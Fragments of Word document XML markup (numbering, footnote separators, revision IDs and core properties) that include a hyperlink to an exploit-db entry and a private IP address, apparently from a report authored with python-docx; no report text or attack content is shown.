    </w:p>
    <w:sectPr w:rsidR="009F0233" w:rsidRPr="004F7614" w:rsidSect="00034616">
      <w:headerReference w:type="default" r:id="rId26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3C3DD2" w14:textId="77777777" w:rsidR="00E84EBE" w:rsidRDefault="00E84EBE" w:rsidP="004F7614">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:separator/>
      </w:r>
    </w:p>
  </w:endnote>
  <w:endnote w:type="continuationSeparator" w:id="0">
    <w:p w14:paraId="64F11889" w14:textId="77777777" w:rsidR="00E84EBE" w:rsidRDefault="00E84EBE" w:rsidP="004F76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1"/>
    <w:family w:val="auto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4BF104" w14:textId="77777777" w:rsidR="00E84EBE" w:rsidRDefault="00E84EBE" w:rsidP="004F7614">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:separator/>
      </w:r>
    </w:p>
  </w:footnote>
  <w:footnote w:type="continuationSeparator" w:id="0">
    <w:p w14:paraId="148A0045" w14:textId="77777777" w:rsidR="00E84EBE" w:rsidRDefault="00E84EBE" w:rsidP="004F76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403275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E61DA59" w14:textId="2C04927B" w:rsidR="004F7614" w:rsidRDefault="004F7614" w:rsidP="004F761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D3D8718" w14:textId="77777777" w:rsidR="004F7614" w:rsidRDefault="004F76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04850801">
    <w:abstractNumId w:val="8"/>
  </w:num>
  <w:num w:numId="2" w16cid:durableId="197864017">
    <w:abstractNumId w:val="6"/>
  </w:num>
  <w:num w:numId="3" w16cid:durableId="484470957">
    <w:abstractNumId w:val="5"/>
  </w:num>
  <w:num w:numId="4" w16cid:durableId="387655013">
    <w:abstractNumId w:val="4"/>
  </w:num>
  <w:num w:numId="5" w16cid:durableId="246429719">
    <w:abstractNumId w:val="7"/>
  </w:num>
  <w:num w:numId="6" w16cid:durableId="832843876">
    <w:abstractNumId w:val="3"/>
  </w:num>
  <w:num w:numId="7" w16cid:durableId="2058432348">
    <w:abstractNumId w:val="2"/>
  </w:num>
  <w:num w:numId="8" w16cid:durableId="197401978">
    <w:abstractNumId w:val="1"/>
  </w:num>
  <w:num w:numId="9" w16cid:durableId="6870981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739E9"/>
    <w:rsid w:val="004F7614"/>
    <w:rsid w:val="00873DD9"/>
    <w:rsid w:val="009F0233"/>
    <w:rsid w:val="00AA1D8D"/>
    <w:rsid w:val="00B47730"/>
    <w:rsid w:val="00BF44D6"/>
    <w:rsid w:val="00CB0664"/>
    <w:rsid w:val="00DE751D"/>
    <w:rsid w:val="00E62FC4"/>
    <w:rsid w:val="00E84EBE"/>
    <w:rsid w:val="00FC693F"/>
    <w:rsid w:val="00FD7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78C00BB"/>
  <w14:defaultImageDpi w14:val="300"/>
  <w15:docId w15:val="{1FD89241-68F5-4EBF-94FC-A6D615A63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pPr>
      <w:spacing w:after="240" w:line="48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75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E751D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BF44D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44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92.168.150.130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exploit-db.com/exploits/42033" TargetMode="External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713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4774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NABIN DHUNGANA</dc:creator>
  <cp:keywords/>
  <dc:description>generated by python-docx</dc:description>
  <cp:lastModifiedBy>NABIN DHUNGANA</cp:lastModifiedBy>
  <cp:revision>4</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2013-12-23T23:15:00Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2025-06-17T11:56:00Z</dcterms:modified>
  <cp:category/>
</cp:coreProperties>
</file>